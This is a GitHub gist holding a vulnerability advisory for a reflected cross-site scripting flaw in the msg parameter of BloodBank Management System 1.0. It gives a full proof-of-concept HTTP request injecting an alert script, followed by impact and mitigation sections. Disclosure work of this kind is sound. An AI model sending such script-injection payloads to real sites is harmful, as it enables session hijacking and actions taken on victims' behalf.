
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F62ad5208270c67834d02818d6ba44126)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F62ad5208270c67834d02818d6ba44126&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F62ad5208270c67834d02818d6ba44126) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F62ad5208270c67834d02818d6ba44126&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@higordiego](https://avatars.githubusercontent.com/u/10968610?s=64&v=4)](/higordiego)

# [higordiego](/higordiego)/**[xss\_blood\_request.md](/higordiego/62ad5208270c67834d02818d6ba44126)** Secret

Created
October 25, 2024 21:25

Show Gist options

* [Download ZIP](/higordiego/62ad5208270c67834d02818d6ba44126/archive/59551015da23d92e3361769efd789e2e90c9c8b3.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F62ad5208270c67834d02818d6ba44126)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F62ad5208270c67834d02818d6ba44126)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/higordiego/62ad5208270c67834d02818d6ba44126.js&quot;&gt;&lt;/script&gt;
* Save higordiego/62ad5208270c67834d02818d6ba44126 to your computer and use it in GitHub Desktop.

[Code](/higordiego/62ad5208270c67834d02818d6ba44126)
[Revisions
1](/higordiego/62ad5208270c67834d02818d6ba44126/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/higordiego/62ad5208270c67834d02818d6ba44126.js&quot;&gt;&lt;/script&gt;

Save higordiego/62ad5208270c67834d02818d6ba44126 to your computer and use it in GitHub Desktop.

[Download ZIP](/higordiego/62ad5208270c67834d02818d6ba44126/archive/59551015da23d92e3361769efd789e2e90c9c8b3.zip)

 [Raw](/higordiego/62ad5208270c67834d02818d6ba44126/raw/59551015da23d92e3361769efd789e2e90c9c8b3/xss_blood_request.md)

[**xss\_blood\_request.md**](#file-xss_blood_request-md)

## **Affected Version:**

* **BloodBank Management System**: 1.0

## **Vulnerability Information:**

* **Vulnerability Type:** Cross-Site Scripting (XSS)
* **Severity:** HIGH
* **Status:** Unpatched

## **Vulnerable Endpoint:**

* **Path:** `/bloodrequest.php?msg=`

## **Vulnerability Description:**

A **Reflected Cross-Site Scripting (XSS)** vulnerability was discovered in the **blood request functionality** of the BloodBank Management System. This flaw occurs because the `msg` parameter is **not properly sanitized** before being rendered on the web page. This allows an attacker to inject **malicious JavaScript code**, which will be executed when the page is accessed.

Successful exploitation can lead to **session hijacking, redirection to phishing sites, or unauthorized actions** on behalf of the victim. Additionally, this could be exploited for **social engineering attacks** or to spread malware.

---

## **Proof of Concept (PoC):**

Below is an example of a **GET request** that injects JavaScript code via the `msg` parameter:

```

GET /bloodrequest.php?msg=%3cscript%3ealert(%22xss%22)%3c%2fscript%3e%20have%20logged%20in. HTTP/1.1
Host: localhost:8080
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8080/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=48068ce7875c00d88ca3aa2b9269b91f
Connection: keep-alive

```

When this request is executed, the following script will be injected into the page:

```
<script>alert("xss")</script>
```

This will trigger a **JavaScript alert** as a demonstration of the vulnerability.

---

## Image

* [![](https://camo.githubusercontent.com/a47df0fef44cd5cbb8f6caaa93ab0409005604fcbba4aaf2bbd33db45965d0c7/68747470733a2f2f692e6962622e636f2f6842523231536d2f323032342d31302d32312d32302d34382d626c6f6f64726571756573742d63726f73736974652d726571756573742e706e67)](https://camo.githubusercontent.com/a47df0fef44cd5cbb8f6caaa93ab0409005604fcbba4aaf2bbd33db45965d0c7/68747470733a2f2f692e6962622e636f2f6842523231536d2f323032342d31302d32312d32302d34382d626c6f6f64726571756573742d63726f73736974652d726571756573742e706e67)
* [![](https://camo.githubusercontent.com/eb8131b2af4ed09eb7ac7586d4b2fbb5dba9a72ee4bcc619de59cdb242f1fe2f/68747470733a2f2f692e6962622e636f2f3538744e376b782f323032342d31302d32312d32302d34372d626c6f6f64726571756573742d63726f73736974652d726571756573742e706e67)](https://camo.githubusercontent.com/eb8131b2af4ed09eb7ac7586d4b2fbb5dba9a72ee4bcc619de59cdb242f1fe2f/68747470733a2f2f692e6962622e636f2f3538744e376b782f323032342d31302d32312d32302d34372d626c6f6f64726571756573742d63726f73736974652d726571756573742e706e67)

## **Impact:**

* **Session Hijacking:** An attacker could steal session cookies and impersonate users.
* **Phishing Attacks:** Victims could be redirected to malicious sites to steal credentials.
* **Malware Spread:** Malicious scripts could be executed on the client’s browser.
* **Data Manipulation:** Attackers could modify the content displayed to users.
* **Reputational Damage:** Users may lose trust in the system due to malicious behavior.

---

## **Mitigation Recommendations:**

1. **Input Validation and Sanitization:** Sanitize all user input by escaping special characters like `<`, `>`, and `"`.
2. **Use HTTP Headers:** Implement a **Content Security Policy (CSP)** to prevent script execution from unauthorized sources.
3. **Encoding Output:** Properly encode dynamic content before rendering it on web pages to prevent script injection.
4. **Use Prepared Statements:** Avoid dynamically building HTML with user-provided data.
5. **Security Testing:** Perform regular **penetration testing** to identify and fix XSS vulnerabilities early.

---

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fhigordiego%2F62ad5208270c67834d02818d6ba44126)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

